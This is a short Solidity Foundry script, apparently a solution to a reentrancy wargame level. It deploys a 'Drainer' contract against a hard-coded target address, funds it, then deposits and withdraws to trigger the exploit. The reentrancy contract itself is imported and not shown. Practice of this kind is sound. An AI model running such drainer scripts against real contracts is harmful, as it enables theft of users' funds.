// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.2;

import {Script, console} from "forge-std/Script.sol";
import {Drainer} from "../src/Reentrancy.sol";

contract ReentrancyScript is Script {

    function run() public {
        vm.startBroadcast();
        Drainer drainer = new Drainer{value:2000000000000000}(0x927cB8C07E4b803DF893Bf4c8f13927E39402D8A);
        drainer.donateToInstance(0.001 ether);
        drainer.withdrawFromInstance(0.0001 ether);
        vm.stopBroadcast();
    }
}
